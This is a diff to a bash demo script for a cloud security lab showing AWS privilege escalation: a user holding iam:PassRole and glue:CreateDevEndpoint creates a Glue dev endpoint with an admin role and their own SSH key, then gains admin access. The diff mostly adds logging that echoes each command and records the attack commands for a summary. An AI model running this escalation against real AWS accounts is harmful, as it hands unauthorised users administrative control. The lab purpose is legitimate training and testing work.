@@ -3,7 +3,9 @@
 # Demo script for iam:PassRole + glue:CreateDevEndpoint privilege escalation
 # This script demonstrates how a user with PassRole and CreateDevEndpoint can escalate to admin
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-glue-001-to-admin-starting-user"
@@ -76,6 +96,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -87,6 +108,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -94,6 +116,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -120,6 +143,7 @@ echo "Target Role ARN: $ROLE_ARN"
 echo "Dev Endpoint Name: $DEV_ENDPOINT_NAME"
 echo ""
 
+show_attack_cmd "aws glue create-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --role-arn \"$ROLE_ARN\" --public-key \"$SSH_PUBLIC_KEY\" --glue-version \"1.0\" --number-of-nodes 2 --output json"
 aws glue create-dev-endpoint \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
     --role-arn "$ROLE_ARN" \
@@ -148,6 +172,7 @@ WAIT_COUNT=0
 ENDPOINT_STATUS=""
 
 while [ $WAIT_COUNT -lt $MAX_WAIT ]; do
+    show_cmd "aws glue get-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.Status' --output text"
     ENDPOINT_STATUS=$(aws glue get-dev-endpoint \
         --endpoint-name "$DEV_ENDPOINT_NAME" \
         --query 'DevEndpoint.Status' \
@@ -177,6 +202,7 @@ fi
 
 # Step 8: Get endpoint address
 echo -e "${YELLOW}Step 8: Retrieving Dev Endpoint connection details${NC}"
+show_cmd "aws glue get-dev-endpoint --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
 ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
     --endpoint-name "$DEV_ENDPOINT_NAME" \
     --query 'DevEndpoint.PublicAddress' \
@@ -254,6 +280,13 @@ echo -e "  → (PassRole + CreateDevEndpoint) → Glue Dev Endpoint with $TARGET
 echo -e "  → (SSH Access) → Execute AWS commands as admin"
 echo -e "  → Admin Access"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Glue Dev Endpoint: $DEV_ENDPOINT_NAME"
 echo "- Endpoint Address: $ENDPOINT_ADDRESS"
@@ -268,3 +301,6 @@ echo ""
 echo -e "${YELLOW}To clean up and stop charges:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
